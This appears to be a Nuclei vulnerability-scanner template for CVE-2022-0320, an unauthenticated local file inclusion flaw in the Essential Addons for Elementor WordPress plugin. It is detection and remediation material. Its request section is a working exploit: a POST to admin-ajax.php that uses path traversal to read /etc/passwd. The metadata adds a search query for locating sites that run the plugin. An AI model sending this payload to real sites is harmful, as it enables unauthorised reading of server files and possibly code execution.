id: CVE-2022-0320

info:
  name: Essential Addons for Elementor LFI Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: The Essential Addons for Elementor WordPress plugin before 5.0.5 does not validate and sanitise some template data before it them in include statements, which could allow unauthenticated attackers to perform Local File Inclusion attack and read arbitrary files on the server, this could also lead to RCE via user uploaded files or other LFI to RCE techniques.
  impact: |
    An attacker could exploit this vulnerability to read sensitive files on the server.
  remediation: |
    Update Essential Addons for Elementor plugin to the latest version to mitigate CVE-2022-0320.
  reference:
    - https://wpscan.com/vulnerability/0d02b222-e672-4ac0-a1d4-d34e1ecf4a95
    - https://github.com/0x9567b/CVE-2022-0320
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/nomi-sec/PoC-in-GitHub
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0320
    cwe-id: CWE-22
    epss-score: 0.00276
    epss-percentile: 0.68968
    cpe: cpe:2.3:a:wpdeveloper:essential_addons_for_elementor:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: wpdeveloper
    product: essential_addons_for_elementor
    framework: wordpress
    google-query: inurl:/wp-content/plugins/essential-addons-for-elementor-lite
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      X-Requested-With: XMLHttpRequest

    body: |
      action=load_more&class=Essential_Addons_Elementor\Elements\Post_Grid&args=orderby=date&order=desc&ignore_sticky_posts=1&post_status=publish&posts_per_page=4&offset=0&post_type=post&page=2&page_id=5512&widget_id=19f1b2c&nonce=7c9c8da06d&template_info[dir]=lite&template_info[file_name]=../../../../../../etc/passwd&template_info[name]=Post-Grid
    matchers:
      - type: word
        words:
          - "root:x"
        part: body
